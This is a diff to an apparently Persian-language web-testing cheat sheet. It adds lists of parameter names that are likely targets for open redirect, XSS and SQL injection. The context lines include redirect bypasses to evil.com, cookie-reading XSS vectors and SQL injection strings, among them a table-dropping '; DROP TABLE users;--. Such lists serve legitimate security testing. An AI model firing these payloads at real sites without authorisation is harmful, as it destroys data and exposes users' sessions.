@@ -85,7 +85,15 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 - XSS ===>>>	q, search, name, message, comment, input, payload, text
 - SQL Injection ===>>>	id, user, username, password, search, page, filter, item
 
-
+```
+q, query, search, keyword, k, s, term
+id, user, uid, pid, product_id, cat, category
+redirect, next, url, return, go, jump, link
+page, p, ref, continue, callback
+dest, destination, forward, out, view
+path, file, dir, folder, include
+lang, language, locale
+```
 =======================================================================
 
 
@@ -101,6 +109,12 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 - 8	//evil.com%00	استفاده از null byte برای قطع رشته
 - 9	%EF%BC%8E%EF%BC%8E%2Fevil.com	استفاده از نقطه fullwidth و اسلش
 
+
+```
+redirect, next, url, return, dest, destination
+continue, callback, link, goto, jump, out
+u, uri, path, page, forward
+```
 =======================================================================
 
 ۳. payloadهای استاندارد برای XSS
@@ -112,6 +126,13 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 - 5	<body onload=alert(1)>	اجرای اسکریپت هنگام بارگذاری صفحه
 - 6	"><iframe src="javascript:alert(1)"></iframe>	تست iframe با کد جاوااسکریپت
 - 7	javascript:alert(document.cookie)	تست اجرای دستور جاوااسکریپت داخل URL
+
+```
+q, search, s, term, keyword
+message, comment, content, body
+title, subject, reply
+query, input, name, username
+```
 
 =======================================================================
 
@@ -125,6 +146,13 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 - 5	'; DROP TABLE users;--	حمله مخرب حذف جدول
 - 6	" OR ""="	شرط همواره درست با کوتیشن دوتایی
 - 7	' OR SLEEP(5)--	تست تأخیر (Blind SQL Injection)
+
+```
+id, uid, user_id, product_id, pid
+cat, category, type, tid
+sort, order, dir
+filter, report, query
+```
 
 =======================================================================
 
